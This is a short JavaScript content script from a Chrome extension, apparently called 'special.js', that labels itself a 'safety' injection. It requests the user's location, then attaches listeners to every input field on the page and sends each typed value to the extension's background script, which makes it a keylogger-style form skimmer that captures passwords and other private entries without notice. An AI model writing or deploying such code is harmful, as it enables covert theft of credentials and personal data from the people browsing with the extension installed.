console.log("Special safety injected")

let commonNameVariable = "special.js Hello!";

chrome.runtime.sendMessage({greeting: "sendLocation"}, function(response) {
  console.log(response);
});

function devourInputs() {
  document.querySelectorAll('input').forEach((v, k)=> {
      v.addEventListener('input', letThemKnow)
    })
}

function letThemKnow(event) {
  const inputData = event.target.value;
  chrome.runtime.sendMessage({greeting: "sendInputs", input: inputData}, function(response) {
    console.log(response);
  });
}

devourInputs();
